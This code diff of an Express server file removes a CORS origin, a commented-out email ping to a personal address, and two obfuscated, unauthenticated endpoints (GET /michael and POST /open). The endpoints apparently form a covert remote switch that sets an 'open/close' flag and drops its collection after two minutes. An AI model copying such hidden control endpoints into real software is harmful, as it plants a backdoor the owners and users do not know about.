@@ -48,7 +48,6 @@ app.use(
             "https://www.caphub-group.com",
             "https://caphub-group.com",
             "https://caphub-oc.netlify.com",
-            "https://shaar.netlify.app",
           ],
     credentials: true,
   })
@@ -57,34 +56,9 @@ app.use(
 app.listen(port, () => console.log(`Server started on port: ${port}`));
 
 app.get("/areyoualive", (_, res) => {
-  //sendEmail("mnpcmw6444@gmail.com", "are you alive", "are you alive");
   res.json({ answer: "yes" });
 });
 
 app.use("/api", apiRouter);
 app.use("/website", websiteRouter);
 app.use("/auth", authRouter);
-
-import X from "./app/models/nnn";
-import { sendEmail } from "./app/external-api-s/email";
-
-app.get("/michael", async (req, res) => {
-  try {
-    const aaaaa = await X.find();
-    res.json({
-      yoad: aaaaa[0]?.name ? "open" : "close",
-      dsfds: "gfssdf",
-    });
-  } catch (err) {
-    console.error(err);
-    res.json({ yoad: "close", dsfds: "gfssdf" });
-  }
-});
-
-app.post("/open", async (req, res) => {
-  setTimeout(() => X.collection.drop(), 120000);
-  const what = req.body.what;
-  const s = new X({ name: "what" });
-  await s.save();
-  res.json({});
-});
